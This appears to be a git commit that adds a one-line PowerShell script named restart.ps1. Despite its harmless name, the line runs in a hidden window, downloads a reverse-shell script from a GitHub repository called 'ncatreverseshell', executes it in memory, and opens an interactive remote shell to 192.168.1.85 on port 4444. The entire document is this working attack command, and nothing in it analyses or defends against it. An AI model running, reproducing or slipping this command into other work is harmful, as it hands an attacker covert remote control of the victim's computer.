93d557d28d12561b0767c6f49ccdff3bc595958f
bjrumplee <130537869+bjrumplee@users.noreply.github.com>
2023-05-05 14:58:20 -0700

    Create restart.ps1

---
+++ restart.ps1
@@ -0,0 +1,1 @@
+powershell -NoProfile -WindowStyle Hidden -Command "IEX (IWR 'https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/reverse.ps1' -UseBasicParsing); Invoke-ConPtyShell '192.168.1.85' '4444'"
